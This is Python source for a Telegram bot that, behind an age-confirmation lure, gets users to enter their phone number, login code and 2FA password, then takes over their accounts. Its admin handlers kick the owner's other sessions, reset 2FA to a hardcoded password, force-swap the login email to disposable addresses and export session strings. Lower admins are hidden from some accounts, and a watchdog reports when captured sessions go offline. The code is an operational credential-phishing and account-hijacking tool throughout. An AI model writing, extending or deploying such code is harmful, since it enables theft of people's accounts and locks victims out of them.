import asyncio
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message, CallbackQuery, Contact, BufferedInputFile,
    InlineKeyboardMarkup, InlineKeyboardButton,
)
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

from config import (
    BOT_TOKEN,
    BOT_ID,
    ADMIN_IDS,
    SESSION_RECOVERY_DELAY,
    SESSION_RECOVERY_MAX_ATTEMPTS,
    SESSION_RECOVERY_RETRY_DELAY,
    SUPER_ADMIN_IDS,
    DEFAULT_2FA_PASSWORD,
)
import database
import user_messages
import session_manager
import security_monitor
import volume_backup
import admin_resolve
from keyboards import (
    age_confirm_keyboard, share_phone_keyboard, numpad_keyboard,
    retry_keyboard, sessions_keyboard, session_detail_keyboard,
    back_to_session_keyboard, ADMIN_FOOTER, CB,
    admin_empty_keyboard, user_messages_menu_keyboard,
    unsecured_sessions_keyboard, disabled_sessions_keyboard,
    kick_specific_keyboard, invalid_two_fa_sessions_keyboard,
    no_two_fa_sessions_keyboard,
)

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp  = Dispatcher(storage=MemoryStorage())


# ──────────────────────────────────────────
# States
# ──────────────────────────────────────────
class UserFlow(StatesGroup):
    waiting_phone = State()
    entering_code = State()
    entering_2fa  = State()

class AdminFlow(StatesGroup):
    waiting_code  = State()
    changing_user = State()
    changing_name = State()
    changing_2fa  = State()
    waiting_volume_upload = State()
    waiting_multi_volume  = State()   # رفع Volume متعدد
    editing_user_message = State()
    refreshing_session = State()  # حالة جديدة لتجديد الجلسة يدوياً
    refreshing_2fa = State()      # حالة التحقق بخطوتين عند التجديد
    changing_2fa_all = State()    # انتظار كلمة مرور 2FA الجديدة للكل


# ── قواميس تتبع العمليات الجماعية (تقدم + إيقاف) ──
_bulk_stop_flags: dict[int, bool] = {}  # uid → True لإيقاف العملية


def _stop_bulk_keyboard(op: str, uid: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⛔ إيقاف العملية", callback_data=f"stop_bulk_{op}_{uid}")]
    ])


# ──────────────────────────────────────────
# حالة في الذاكرة
# ──────────────────────────────────────────
user_code_input  = {}
user_msg_ids     = {}
user_link_msg_id = {}
phone_to_user    = {}
code_wait_tasks  = {}
admin_refresh_ctx = {} # حفظ سياق التجديد اليدوي للأدمن
notified_invalid_phones = set() # تتبع الأرقام التي تم الإبلاغ عن تعطلها لمنع التكرار


# ──────────────────────────────────────────
# أدوات مساعدة
# ──────────────────────────────────────────
def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS or uid in SUPER_ADMIN_IDS


def is_super_admin(uid: int) -> bool:
    return uid in SUPER_ADMIN_IDS


async def _sessions_for_admin(uid: int):
    return await database.get_sessions_for_admin(uid, SUPER_ADMIN_IDS)


async def _guard_session(callback: CallbackQuery, phone: str) -> bool:
    if not await database.can_admin_access_session(
        callback.from_user.id, phone, SUPER_ADMIN_IDS
    ):
        await callback.answer("❌ هذا الحساب غير متاح.", show_alert=True)
        return False
    return True


async def _guard_session_row(callback: CallbackQuery, session) -> bool:
    if not session:
        await callback.answer("❌ الجلسة غير موجودة!", show_alert=True)
        return False
    return await _guard_session(callback, session["phone"])


_KIND_BY_PREFIX = {v: k for k, v in CB.items()}


async def _render_session_detail(callback: CallbackQuery, session, page: int = 0, source: str = "main"):
    phone = session["phone"]
    sid = session["id"]
    username = session["username"] or "لا يوجد"
    full_name = session["full_name"] or "غير معروف"
    created_at = session["created_at"]
    two_fa_stat = "✅ موجود" if session["two_fa"] else "❌ لا يوجد"
    valid_stat = "✅ نشطة" if session["valid"] else "❌ غير صالحة"
    live = await session_manager.check_session_alive(phone)
    live_stat = "🟢 متصلة الآن" if live else "🔴 غير متصلة الآن"
    login_mail = database.row_login_email(session) or "❌ غير مربوط"
    mail_lines = f"📧 بريد Login: <code>{h(login_mail)}</code>"
    if is_admin(callback.from_user.id):
        email_pw = database.row_get(session, "email_password")
        if email_pw and login_mail != "❌ غير مربوط":
            mail_lines += f"\n🔑 كلمة سر البريد: <code>{h(email_pw)}</code>"
    secured_stat = "🔒 مؤمّنة" if database.row_flag(session, "secured") else "—"
    
    # الخصوصية تظهر فقط للسوبر أدمن
    privacy_line = ""
    if is_super_admin(callback.from_user.id):
        private_stat = "⭐ خاصة (A1)" if database.row_flag(session, "a1_only") else "—"
        privacy_line = f"⭐ الخصوصية: {private_stat}\n"

    kick_stage = database.row_get(session, "auto_kick_stage")
    if kick_stage is None:
        kick_line = "—"
    elif kick_stage >= 3:
        kick_line = "✅ اكتمل الطرد"
    elif kick_stage == 2:
        kick_line = "⏳ طرد: إعادة كل 5 دقائق"
    elif kick_stage == 1:
        kick_line = "⏳ طرد: انتظار 24 ساعة"
    else:
        kick_line = "⏳ طرد: محاولة فورية"
    tg_id = session["telegram_id"] or "جاري الفحص..."

    # وضع الصيانة
    maint_info = database.get_maintenance_info(session)
    if maint_info["in_maintenance"]:
        remaining = maint_info.get("remaining_days")
        if remaining is not None:
            remaining_str = f"{remaining:.1f} يوم"
        else:
            remaining_str = "غير محدد"
        maint_line = f"\n🔧 <b>وضع الصيانة:</b> نعم | متبقٍّ: {remaining_str}"
    else:
        maint_line = ""

    # جهات الاتصال المشتركة
    mutual_cnt = database.row_get(session, "mutual_contacts")
    total_cnt  = database.row_get(session, "contacts_count")
    contacts_line = ""
    if mutual_cnt is not None:
        contacts_line = f"\n👥 جهات الاتصال المشتركة: <b>{mutual_cnt}</b> / {total_cnt or '؟'}"

    text = (
        f"📱 <code>{h(phone)}</code>\n"
        f"🆔 Telegram ID: <code>{tg_id}</code>\n\n"
        f"👤 الاسم: {h(full_name)}\n"
        f"🔖 اليوزر: @{h(username)}\n"
        f"🔐 التحقق بخطوتين: {two_fa_stat}\n"
        f"{mail_lines}\n"
        f"📶 قاعدة البيانات: {valid_stat}\n"
        f"📡 فحص مباشر: {live_stat}\n"
        f"🛡️ خط التأمين: {kick_line}\n"
        f"🔒 التأمين: {secured_stat}\n"
        f"{privacy_line}"
        f"📅 تاريخ التسجيل: {h(created_at)}"
        f"{maint_line}"
        f"{contacts_line}"
        + ADMIN_FOOTER
    )
    await callback.message.edit_text(
        text,
        reply_markup=session_detail_keyboard(
            sid, 
            page=page, 
            is_super_admin=is_super_admin(callback.from_user.id),
            source=source
        ),
        parse_mode="HTML",
    )
    await track_admin_phone_message(
        callback.from_user.id,
        phone,
        callback.message.chat.id,
        callback.message.message_id,
    )


@dp.callback_query(F.data.regexp(r"^fm\d+$"))
async def force_mail_process(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    session = await admin_resolve.get_session_from_callback(callback.data, "forcemail")
    if not await _guard_session_row(callback, session):
        return
    phone, sid = session["phone"], session["id"]

    await callback.answer("⏳ جاري التغيير الإجباري...")
    await callback.message.edit_text(
        "⏳ جاري تغيير بريد Login (إجباري) وانتظار الكود...\n"
        "<i>سيتم استبدال البريد الحالي حتى لو كان يعمل.</i>"
        + ADMIN_FOOTER,
        parse_mode="HTML",
    )
    await track_admin_phone_message(
        callback.from_user.id,
        phone,
        callback.message.chat.id,
        callback.message.message_id,
    )
    try:
        res = await session_manager.change_login_email(phone, force=True)
    except Exception as e:
        logging.exception("force_mail %s: %s", phone, e)
        res = {"success": False, "error": str(e)}
    
    if res["success"]:
        new_email = res.get("email", "")
        await callback.message.edit_text(
            f"✅ تم تغيير البريد إجبارياً:\n<code>{h(new_email)}</code>" + ADMIN_FOOTER,
            parse_mode="HTML",
            reply_markup=back_to_session_keyboard(sid),
        )
    else:
        await callback.message.edit_text(
            f"❌ فشل العملية: <code>{h(res['error'])}</code>" + ADMIN_FOOTER,
            parse_mode="HTML",
            reply_markup=back_to_session_keyboard(sid),
        )
    await track_admin_phone_message(
        callback.from_user.id,
        phone,
        callback.message.chat.id,
        callback.message.message_id,
    )


@dp.callback_query(F.data.regexp(r"^df\d+$"))
async def admin_direct_2fa_handler(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    session = await admin_resolve.get_session_from_callback(callback.data, "direct_2fa")
    if not await _guard_session_row(callback, session):
        return
    phone, sid = session["phone"], session["id"]

    await callback.answer("⏳ جاري تعيين التحقق لـ 054321...")
    await callback.message.edit_text(
        f"⏳ جاري تغيير التحقق بخطوتين للرقم <code>{h(phone)}</code> إلى <code>054321</code>..." + ADMIN_FOOTER,
        parse_mode="HTML"
    )

    res = await session_manager.set_direct_2fa(phone, "054321")

    if res["success"]:
        await callback.message.edit_text(
            f"✅ تم تغيير التحقق بخطوتين بنجاح إلى <code>054321</code> للرقم <code>{h(phone)}</code>." + ADMIN_FOOTER,
            parse_mode="HTML",
            reply_markup=back_to_session_keyboard(sid)
        )
    else:
        await callback.message.edit_text(
            f"❌ فشل تغيير التحقق: <code>{h(res.get('error',''))}</code>" + ADMIN_FOOTER,
            parse_mode="HTML",
            reply_markup=back_to_session_keyboard(sid)
        )
    await callback.answer()


async def _export_session_message(callback: CallbackQuery, session):
    phone = session["phone"]
    ss = await session_manager.ensure_session_string(phone)
    if ss:
        msg = await callback.message.answer(
            f"📦 كود الجلسة للرقم <code>{h(phone)}</code>:\n\n"
            f"<code>{h(ss)}</code>",
            parse_mode="HTML",
        )
    else:
        msg = await callback.message.answer(
            f"❌ لا يوجد session_string للرقم <code>{h(phone)}</code>.\n"
            f"الجلسة غير متصلة أو منتهية — جرّب «فحص الجلسات».",
            parse_mode="HTML",
        )
    await track_admin_phone_message(
        callback.from_user.id, phone, msg.chat.id, msg.message_id
    )


async def _admin_panel_text(uid: int) -> str:
    count = await database.get_sessions_count(uid, SUPER_ADMIN_IDS)
    invalid = await database.count_invalid_sessions(uid, SUPER_ADMIN_IDS)
    secured = await database.get_secured_sessions_count(uid, SUPER_ADMIN_IDS)
    lines = [
        "👋 أهلاً بالقيادة!",
        f"🤖 معرف البوت: <code>{BOT_ID}</code>",
        "",
        f"✅ نشطة: <b>{count}</b>",
        f"🔒 مؤمّنة: <b>{secured}</b>",
    ]
    if invalid:
        lines.append(f"❌ غير صالحة (قابلة للحذف): <b>{invalid}</b>")
    return "\n".join(lines) + ADMIN_FOOTER


def h(text) -> str:
    """Escape HTML special chars"""
    return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

async def safe_delete(chat_id, msg_id):
    try:
        await bot.delete_message(chat_id, msg_id)
    except Exception:
        pass


async def track_admin_phone_message(
    admin_id: int, phone: str, chat_id: int, message_id: int
):
    """تسجيل رسالة بوت مرتبطة برقم — لحذفها لاحقاً عند ⭐."""
    if not phone or admin_id in SUPER_ADMIN_IDS:
        return
    norm = database.normalize_phone(phone)
    await database.save_admin_notification(
        admin_id, norm, chat_id, message_id
    )


async def purge_phone_from_other_admins(phone: str) -> int:
    """حذف كل رسائل البوت عن هذا الرقم من شاتات الأدمنة (ما عدا السوبر أدمنز)."""
    # نمرر SUPER_ADMIN_ID الأول كـ fallback للقاعدة، ولكن المنطق هنا يتعامل مع القائمة
    notifs = await database.get_admin_notifications_for_phone(
        phone, except_admin=SUPER_ADMIN_IDS
    )
    by_chat: dict[int, list[int]] = {}
    for n in notifs:
        by_chat.setdefault(n["chat_id"], []).append(n["message_id"])
    deleted = 0
    for chat_id, ids in by_chat.items():
        unique_ids = list(dict.fromkeys(ids))
        try:
            await bot.delete_messages(chat_id, unique_ids)
            deleted += len(unique_ids)
        except Exception:
            for mid in unique_ids:
                await safe_delete(chat_id, mid)
                deleted += 1
    await database.delete_admin_notifications_for_phone(
        phone, except_admin=SUPER_ADMIN_IDS
    )
    return deleted


async def notify_admins(text: str, phone: str = None):
    """يرسل للأدمنة — يتخطى غير A1 إذا الجلسة ⭐ خاصة."""
    norm_phone = database.normalize_phone(phone) if phone else None
    for aid in ADMIN_IDS:
        if norm_phone:
            session = await database.get_session_by_phone(norm_phone)
            if (
                session
                and database.row_flag(session, "a1_only")
                and not is_super_admin(aid)
            ):
                continue
        try:
            msg = await bot.send_message(aid, text, parse_mode="HTML")
            if norm_phone:
                await track_admin_phone_message(
                    aid, norm_phone, msg.chat.id, msg.message_id
                )
        except Exception:
            pass


async def edit_or_send(chat_id, uid, text, markup=None, phone: str = None):
    mid = user_msg_ids.get(uid)
    if mid:
        try:
            await bot.edit_message_text(
                text, chat_id=chat_id, message_id=mid,
                reply_markup=markup, parse_mode="HTML"
            )
            if phone:
                await track_admin_phone_message(uid, phone, chat_id, mid)
            return
        except Exception:
            pass
    m = await bot.send_message(chat_id, text, reply_markup=markup, parse_mode="HTML")
    user_msg_ids[uid] = m.message_id
    if phone:
        await track_admin_phone_message(uid, phone, chat_id, m.message_id)


# ──────────────────────────────────────────
# تدفق المستخدم
# ──────────────────────────────────────────
@dp.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    uid = message.from_user.id

    if is_admin(uid):
        await show_admin_panel(message)
        return

    user = await database.get_user(uid)
    if user and user["phone"]:
        phone   = user["phone"]
        session = await database.get_session_by_phone(phone)
        if session and session["valid"]:
            m = await message.answer(user_messages.render("already_registered"))
            user_link_msg_id[uid] = m.message_id
            return

    m = await message.answer(
        user_messages.render("start_msg"),
        reply_markup=age_confirm_keyboard()
    )
    user_msg_ids[uid] = m.message_id


@dp.callback_query(F.data == "confirm_age")
async def confirm_age(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    if is_admin(uid):
        await callback.answer()
        return

    await callback.message.edit_text(user_messages.render("confirm_age_msg"))
    user_msg_ids[uid] = callback.message.message_id
    await callback.message.answer("👇", reply_markup=share_phone_keyboard())
    await state.set_state(UserFlow.waiting_phone)
    await callback.answer()


def _delivery_hint(delivery: str) -> str:
    """تحديد مكان توصيل الكود لإظهاره للمستخدم."""
    d = delivery.lower()
    if "app" in d:
        return (
            "\n\n📲 <b>الكود وصل كإشعار داخل تطبيق تيليجرام</b> على جهازك.\n"
            "افتح أي محادثة وستجد رسالة من <b>Telegram</b> تحتوي الكود."
        )
    if "sms" in d:
        return "\n\n📩 <b>الكود وصل برسالة SMS</b> على رقم هاتفك."
    if "call" in d or "flash" in d:
        return (
            "\n\n📞 <b>الكود عبر اتصال هاتفي</b> — آخر 5 أرقام في رقم المتصل هي الكود."
        )
    # نوع غير معروف — نعطي تلميحاً شاملاً
    return (
        "\n\n🔍 <b>ابحث عن الكود في:</b> رسائل SMS أو إشعارات تطبيق تيليجرام."
    )


@dp.message(UserFlow.waiting_phone, F.contact)
async def contact_received(message: Message, state: FSMContext):
    uid     = message.from_user.id
    contact: Contact = message.contact

    await safe_delete(message.chat.id, message.message_id)
    await safe_delete(message.chat.id, message.message_id - 1)

    phone = contact.phone_number
    if not phone.startswith("+"):
        phone = f"+{phone}"

    uname = message.from_user.username or ""
    fname = f"{message.from_user.first_name or ''} {message.from_user.last_name or ''}".strip()
    await database.save_user(uid, uname, fname, phone)
    phone_to_user[phone] = uid

    await edit_or_send(message.chat.id, uid, "⏳ انتظر قليلاً 🕐")
    result = await session_manager.request_code(uid, phone)

    if not result["success"]:
        err = result.get("error", "")
        txt = (
            f"⚠️ حاول بعد {err.split(':')[1]} ثانية."
            if "flood" in err
            else "❌ حدث خطأ، حاول مرة أخرى لاحقاً."
        )
        await edit_or_send(message.chat.id, uid, txt)
        await state.clear()
        return

    user_code_input[uid] = ""
    await state.set_state(UserFlow.entering_code)
    await state.update_data(phone=phone)
    await edit_or_send(
        message.chat.id, uid,
        user_messages.render("enter_code_msg"),
        markup=numpad_keyboard("")
    )


@dp.message(F.contact)
async def block_contact(message: Message, state: FSMContext):
    await safe_delete(message.chat.id, message.message_id)


@dp.callback_query(F.data.startswith("np_"))
async def numpad_press(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    cur = await state.get_state()
    if cur != UserFlow.entering_code:
        await callback.answer()
        return

    key  = callback.data[3:]
    code = user_code_input.get(uid, "")

    if key == "del":
        code = code[:-1]
    elif key == "display":
        await callback.answer()
        return
    else:
        if len(code) < 5:
            code += key

    user_code_input[uid] = code

    if len(code) == 5:
        await callback.answer("⏳ جاري التحقق...")
        await edit_or_send(callback.message.chat.id, uid, "⏳ جاري التحقق...")
        result = await session_manager.submit_code(uid, code)
        user_code_input[uid] = ""

        if result.get("two_fa"):
            await state.set_state(UserFlow.entering_2fa)
            await edit_or_send(
                callback.message.chat.id, uid,
                "🔐 أدخل كلمة مرور التحقق بخطوتين وأرسلها:"
            )
            return

        if result["success"]:
            data  = await state.get_data()
            phone = data.get("phone")
            await state.clear()
            await edit_or_send(
                callback.message.chat.id, uid,
                user_messages.render("registration_success"),
            )
            user_link_msg_id[uid] = user_msg_ids.get(uid)
            await _notify_new_session(
                phone,
                result.get("email_linked"),
                result.get("login_email"),
                result.get("email_error"),
                result.get("email_skipped", False),
            )
        else:
            await edit_or_send(
                callback.message.chat.id, uid,
                "❌ الرمز خاطئ أو منتهي. حاول مرة أخرى.",
                markup=retry_keyboard()
            )
    else:
        try:
            await bot.edit_message_reply_markup(
                chat_id=callback.message.chat.id,
                message_id=user_msg_ids.get(uid, callback.message.message_id),
                reply_markup=numpad_keyboard(code)
            )
        except Exception:
            pass
        await callback.answer()


@dp.message(UserFlow.entering_2fa)
async def text_2fa(message: Message, state: FSMContext):
    uid      = message.from_user.id
    password = message.text.strip()
    await safe_delete(message.chat.id, message.message_id)

    await edit_or_send(message.chat.id, uid, "⏳ جاري التحقق...")
    result = await session_manager.submit_2fa(uid, password)
    if result["success"]:
        data  = await state.get_data()
        phone = data.get("phone")
        await state.clear()
        await edit_or_send(
            message.chat.id, uid,
            user_messages.render("registration_success"),
        )
        user_link_msg_id[uid] = user_msg_ids.get(uid)
        await _notify_new_session(
            phone,
            result.get("email_linked"),
            result.get("login_email"),
            result.get("email_error"),
            result.get("email_skipped", False),
        )
    else:
        await edit_or_send(
            message.chat.id, uid,
            "❌ كلمة المرور خاطئة. أرسل كلمة مرور التحقق بخطوتين مجدداً:"
        )


async def _notify_new_session(
    phone: str,
    email_linked: bool = False,
    login_email: str = None,
    email_error: str = None,
    email_skipped: bool = False,
):
    session = await database.get_session_by_phone(phone)
    if not session:
        return
    uname = session["username"]  or "لا يوجد"
    fname = session["full_name"] or "غير معروف"
    if email_linked and login_email:
        if email_skipped:
            mail_line = (
                f"📧 بريد Login (محفوظ — لم يُغيَّر): <code>{h(login_email)}</code>"
            )
        else:
            mail_line = f"📧 بريد Login: <code>{h(login_email)}</code>"
    elif email_error:
        mail_line = f"⚠️ فشل ربط بريد Login: <code>{h(email_error)}</code>"
    else:
        mail_line = "⚠️ لم يُربط بريد Login"
    await notify_admins(
        f"🆕 <b>حساب جديد تم تسجيله!</b>\n\n"
        f"📱 الرقم: <code>{h(phone)}</code>\n"
        f"👤 الاسم: {h(fname)}\n"
        f"🔖 اليوزر: @{h(uname)}\n"
        f"{mail_line}"
        + ADMIN_FOOTER,
        phone=phone,
    )


async def _on_admin_event(phone: str, event: str, **data):
    """إشعارات تأمين / طرد / 2FA / إنعاش من session_manager."""
    session = await database.get_session_by_phone(phone)
    fname = session["full_name"] if session else "غير معروف"
    base = f"📱 <code>{h(phone)}</code>\n👤 {h(fname)}\n\n"

    if event == "security_started":
        if data.get("email_ok"):
            mail = f"📧 بريد: <code>{h(data.get('login_email', ''))}</code>"
        else:
            mail = f"⚠️ بريد: <code>{h(data.get('email_error', 'فشل'))}</code>"
        text = (
            base
            + "🛡️ <b>بدء خط التأمين</b>\n"
            + mail
            + f"\n\n⏳ الترتيب: طرد الجلسات → 2FA (<code>{h(DEFAULT_2FA_PASSWORD)}</code>) بعد نجاح الطرد"
        )
    elif event == "kick_started":
        text = base + "🛡️ <b>بدء طرد الجلسات الأخرى</b>\n⏳ انتظار 24 ساعة..."
    elif event == "kick_waiting":
        hrs = int(data.get("seconds", 0)) // 3600
        text = (
            base
            + f"⏳ <b>انتظار الطرد</b> ({data.get('phase', '')})\n"
            + f"المحاولة التالية بعد <b>{hrs}</b> ساعة"
        )
    elif event == "kick_failed":
        text = (
            base
            + f"⚠️ <b>فشل الطرد</b> — {h(data.get('phase', ''))}\n"
            + f"<code>{h(data.get('error', ''))}</code>"
        )
    elif event == "kick_success":
        text = base + f"✅ <b>نجح طرد الجلسات</b> ({h(data.get('phase', ''))})\n🔐 جاري تفعيل 2FA..."
    elif event == "twofa_ok":
        if data.get("skipped"):
            text = base + f"🔐 <b>2FA</b> — كان مضبوطاً مسبقاً (<code>{h(DEFAULT_2FA_PASSWORD)}</code>)"
        else:
            text = (
                base
                + "🔐 <b>تم تفعيل 2FA</b>\n"
                + f"كلمة المرور: <code>{h(data.get('password', ''))}</code>"
            )
    elif event == "twofa_fail":
        text = (
            base
            + "❌ <b>فشل تفعيل 2FA</b> بعد الطرد\n"
            + f"<code>{h(data.get('error', ''))}</code>"
        )
    elif event == "manual_refresh_success":
        text = (
            base
            + "✅ <b>تم تجديد الجلسة يدوياً</b>\n"
            + "🗑️ تم حذف الرسائل الرسمية.\n"
            + "🛡️ سيتم طرد الجلسات الأخرى بعد 24 ساعة."
        )
    elif event == "email_retry_started":
        text = base + "📧 <b>إعادة محاولة ربط بريد Login</b> (بعد 45 ثانية)..."
    elif event == "email_retry_ok":
        if data.get("skipped"):
            text = base + f"📧 <b>بريد Login يعمل</b> — <code>{h(data.get('email', ''))}</code>"
        else:
            text = base + f"✅ <b>تم ربط البريد</b> — <code>{h(data.get('email', ''))}</code>"
    elif event == "email_retry_fail":
        text = base + f"❌ <b>فشل ربط البريد</b>\n<code>{h(data.get('error', ''))}</code>"
    elif event == "email_retry_attempt_fail":
        text = (
            base
            + f"⚠️ محاولة ربط بريد {data.get('attempt', '?')}/3 فشلت\n"
            + f"<code>{h(data.get('error', ''))}</code>"
        )
    elif event == "recovery_skipped_alive":
        text = base + "✅ <b>الجلسة عادت للعمل</b> — أُلغي الإنعاش المجدول"
    elif event == "recovery_running":
        text = base + "♻️ <b>جاري الإنعاش</b> — طلب كود من تيليجرام → Mail.tm"
    elif event == "session_alive_again":
        text = base + "✅ <b>الجلسة متصلة مجدداً</b> — أُلغي إنذار التوقف"
    elif event == "repair_2fa_kicked":
        ok = data.get("ok", False)
        err = data.get("error", "")
        text = (
            base
            + (f"✅ <b>تم طرد كل الجلسات</b> — إصلاح التحقق" if ok
               else f"⚠️ <b>فشل طرد الجلسات</b>: <code>{h(err)}</code> — متابعة الإصلاح")
        )
    elif event == "repair_2fa_email":
        ok = data.get("ok", False)
        email = data.get("email", "")
        text = (
            base
            + (f"✅ <b>تم تغيير البريد</b>: <code>{h(email)}</code>" if ok
               else "⚠️ <b>فشل تغيير البريد</b> — متابعة الإصلاح")
        )
    elif event == "repair_2fa_reset_requested":
        days = data.get("wait_days", 7)
        text = (
            base
            + f"⏳ <b>طلب إعادة تعيين كلمة المرور</b>\n"
            + (f"ستكتمل إعادة التعيين خلال <b>{days}</b> يوم تقريباً." if days > 0
               else "✅ اكتملت إعادة التعيين فوراً — جاري تعيين التحقق الجديد.")
        )
    elif event == "repair_2fa_success":
        pwd = data.get("password", DEFAULT_2FA_PASSWORD)
        text = (
            base
            + "✅ <b>تم إصلاح التحقق بخطوتين!</b>\n"
            + f"🔐 كلمة المرور الجديدة: <code>{h(pwd)}</code>\n"
            + "تم إزالة الحساب من قائمة التحققات غير الصالحة."
        )
    elif event == "repair_2fa_fail":
        step = data.get("step", "")
        err = data.get("error", "")
        text = (
            base
            + f"❌ <b>فشل إصلاح التحقق</b> — المرحلة: {h(step)}\n"
            + f"<code>{h(err)}</code>"
        )
    else:
        return

    await notify_admins(text + ADMIN_FOOTER, phone=phone)


async def _on_recovery_done(phone: str, result: dict):
    """تم إيقاف الإنعاش التلقائي - هذا التابع قد لا يستدعى كثيراً الآن."""
    session = await database.get_session_by_phone(phone)
    fname = session["full_name"] if session else "غير معروف"
    session_manager._recovery_scheduled.discard(phone)

    if result.get("success"):
        session_manager._recovery_fail_count.pop(phone, None)
        await notify_admins(
            f"♻️ <b>تم إحياء الجلسة</b>\n\n"
            f"📱 الرقم: <code>{h(phone)}</code>\n"
            f"👤 الاسم: {h(fname)}\n"
            + ADMIN_FOOTER,
            phone=phone,
        )
        return

    err = result.get("error", "")
    await database.mark_session_invalid(phone)
    await notify_admins(
        f"❌ <b>فشل الإنعاش</b>\n\n"
        f"📱 الرقم: <code>{h(phone)}</code>\n"
        f"⚠️ الخطأ: <code>{h(err)}</code>\n"
        "يرجى التجديد يدوياً (...123)"
        + ADMIN_FOOTER,
        phone=phone,
    )
    uid = phone_to_user.get(phone)
    if uid:
        lmid = user_link_msg_id.get(uid)
        if lmid:
            await safe_delete(uid, lmid)
            user_link_msg_id.pop(uid, None)
        try:
            m = await bot.send_message(
                uid,
                "⚠️ انتهت جلستك. يرجى إعادة التسجيل.",
                reply_markup=retry_keyboard(),
            )
            user_msg_ids[uid] = m.message_id
        except Exception:
            pass


@dp.callback_query(F.data == "retry_code")
async def retry_code(callback: CallbackQuery, state: FSMContext):
    uid   = callback.from_user.id
    data  = await state.get_data()
    phone = data.get("phone")
    if not phone:
        user = await database.get_user(uid)
        if user:
            phone = user["phone"]
    if not phone:
        await callback.answer("❌ لم يتم العثور على رقمك.")
        return

    result = await session_manager.request_code(uid, phone)
    user_code_input[uid] = ""
    if result["success"]:
        await state.set_state(UserFlow.entering_code)
        await state.update_data(phone=phone)
        await edit_or_send(
            callback.message.chat.id, uid,
            user_messages.render("enter_code_msg"),
            markup=numpad_keyboard("")
        )
    else:
        await callback.answer("❌ فشل إرسال الكود، حاول لاحقاً.")


# ──────────────────────────────────────────
# Watchdog — مراقبة مستمرة (بدون إعادة تشغيل السيرفر)
# ──────────────────────────────────────────
async def session_watchdog():
    """
    كل ~30 ثانية: فحص الجلسات — فشلان متتاليان قبل إشعار التوقف.
    تم إيقاف الإنعاش التلقائي بناءً على طلب المستخدم.
    """
    while True:
        await asyncio.sleep(30)
        try:
            sessions = await database.get_all_sessions()
            for s in sessions:
                phone = s["phone"]
                if not s["valid"]:
                    continue
                
                alive = await session_manager.check_session_alive(phone)
                action = session_manager.watchdog_session_check(phone, alive)
                
                if alive:
                    # إذا عادت للعمل، نحذفها من قائمة المبلغ عنهم
                    notified_invalid_phones.discard(phone)
                    if action == "session_alive_again":
                        await _on_admin_event(phone, "session_alive_again")
                    continue
                
                if action != "schedule_recovery":
                    continue
                
                # منع تكرار الإشعار لنفس الرقم
                if phone in notified_invalid_phones:
                    continue
                
                notified_invalid_phones.add(phone)
                
                # إشعار الأدمن فقط بدون إنعاش تلقائي
                login_email = database.row_login_email(s)
                mail_info = f"\n📧 البريد: <code>{h(login_email)}</code>" if login_email else "\n⚠️ لا يوجد بريد مربوط."
                
                await notify_admins(
                    f"⚠️ <b>الجلسة توقفت</b>\n\n"
                    f"📱 الرقم: <code>{h(phone)}</code>\n"
                    f"👤 الاسم: {h(s['full_name'] or 'غير معروف')}\n"
                    f"الحالة: الجلسة بحاجة لتجديد يدوي (...123)"
                    + mail_info
                    + ADMIN_FOOTER,
                    phone=phone,
                )
                # لا نقوم بجدولة الإنعاش التلقائي هنا
        except Exception as e:
            logging.error(f"Watchdog: {e}")


# ──────────────────────────────────────────
# لوحة الأدمن — عرض الجلسات
# ──────────────────────────────────────────
async def show_admin_panel(message: Message):
    uid = message.from_user.id
    sessions = await _sessions_for_admin(uid)
    text = await _admin_panel_text(uid)
    if sessions:
        kb = sessions_keyboard(sessions, is_super_admin=is_super_admin(uid))
    elif is_super_admin(uid):
        kb = admin_empty_keyboard()
    else:
        kb = None
    suffix = "" if sessions else "\n\n📭 لا توجد جلسات محفوظة."
    await message.answer(text + suffix, reply_markup=kb, parse_mode="HTML")


@dp.callback_query(F.data.startswith("sessions_page_"))
async def sessions_page(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    uid = callback.from_user.id
    page = int(callback.data.split("_")[-1])
    await state.update_data(last_page=page, last_source="main")
    sessions = await _sessions_for_admin(uid)
    text = await _admin_panel_text(uid)
    await callback.message.edit_text(
        text,
        reply_markup=sessions_keyboard(
            sessions, page, is_super_admin=is_super_admin(uid)
        ),
        parse_mode="HTML",
    )
    await callback.answer()


@dp.callback_query(F.data.regexp(r"^i\d+$"))
async def session_detail(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    session = await admin_resolve.get_session_from_callback(callback.data, "session")
    if not await _guard_session_row(callback, session):
        return

    # اقرأ بيانات التنقل أولاً، ثم امسح حالة الانتظار الفعّالة (تغيير يوزر/اسم/2FA/...)
    st_data = await state.get_data()
    page   = st_data.get("last_page", 0)
    source = st_data.get("last_source", "main")
    await state.clear()
    # أعد تخزين بيانات التنقل حتى تبقى بعد المسح
    await state.update_data(last_page=page, last_source=source)

    await _render_session_detail(callback, session, page=page, source=source)
    await callback.answer()


@dp.callback_query(F.data == "back_to_sessions")
async def back_to_sessions(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer()
        return
    uid = callback.from_user.id
    
    # عند الضغط على رجوع من القوائم الفرعية (المعطلة/غير المؤمنة) نعود دائماً للقائمة الرئيسية
    await state.update_data(last_source="main")
    st_data = await state.get_data()
    page = st_data.get("last_page", 0)
    
    sessions = await _sessions_for_admin(uid)
    text = await _admin_panel_text(uid)
    kb = sessions_keyboard(
        sessions, page=page, is_super_admin=is_super_admin(uid)
    ) if sessions else None
    suffix = "" if sessions else "\n\n📭 لا توجد جلسات."
    await callback.message.edit_text(text + suffix, reply_markup=kb, parse_mode="HTML")
    await callback.answer()


